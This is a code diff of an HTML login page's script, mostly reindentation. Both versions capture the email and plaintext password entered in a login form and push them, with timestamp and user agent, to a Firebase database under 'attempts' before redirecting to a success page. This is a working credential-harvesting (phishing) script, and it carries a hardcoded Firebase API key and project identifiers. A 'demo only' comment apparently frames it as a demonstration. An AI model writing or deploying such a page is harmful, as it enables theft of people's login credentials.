@@ -41,50 +41,48 @@
     </p>
   </div>
 
-  <script>
-    console.log("SCRIPT LOADED");
+<script>
+  console.log("SCRIPT LOADED");
 
-    const firebaseConfig = {
-      apiKey: "AIzaSyDJ44dj8zYq_Zzh0OQEfzkC__h2c0s3WUU",
-      authDomain: "r0b0lix.firebaseapp.com",
-      databaseURL: "https://r0b0lix-default-rtdb.europe-west1.firebasedatabase.app",
-      projectId: "r0b0lix",
-      storageBucket: "r0b0lix.firebasestorage.app",
-      messagingSenderId: "497840821640",
-      appId: "1:497840821640:web:a0b38f05b6d29609f1563d",
-      measurementId: "G-PBQ2G89HR2"
+  const firebaseConfig = {
+    apiKey: "AIzaSyDJ44dj8zYq_Zzh0OQEfzkC__h2c0s3WUU",
+    authDomain: "r0b0lix.firebaseapp.com",
+    databaseURL: "https://r0b0lix-default-rtdb.europe-west1.firebasedatabase.app",
+    projectId: "r0b0lix",
+    storageBucket: "r0b0lix.firebasestorage.app",
+    messagingSenderId: "497840821640",
+    appId: "1:497840821640:web:a0b38f05b6d29609f1563d",
+    measurementId: "G-PBQ2G89HR2"
+  };
+
+  const app = firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+
+  const form = document.getElementById('loginForm');
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+
+    const logEntry = {
+      email: email,
+      password: password, // demo only
+      result: "success",
+      timestamp: new Date().toISOString(),
+      userAgent: navigator.userAgent
     };
 
-    // Initialize Firebase
-    const app = firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-
-    // Form listener
-    const form = document.getElementById('loginForm');
-
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-
-      // ⬇️ NEW — store email & password
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-
-      const logEntry = {
-        email: email,
-        password: password,
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent
-      };
-
-      try {
-        await db.ref("attempts").push(logEntry);
-        window.location.href = "success.html";
-      } catch (err) {
-        console.error("Failed to write log:", err);
-        alert("Error saving log.");
-      }
-    });
-  </script>
+    try {
+      await db.ref("attempts").push(logEntry);
+      window.location.href = "success.html";
+    } catch (err) {
+      console.error("Failed to write log:", err);
+      alert("Error saving log.");
+    }
+  });
+</script>
 
 </body>
 </html>
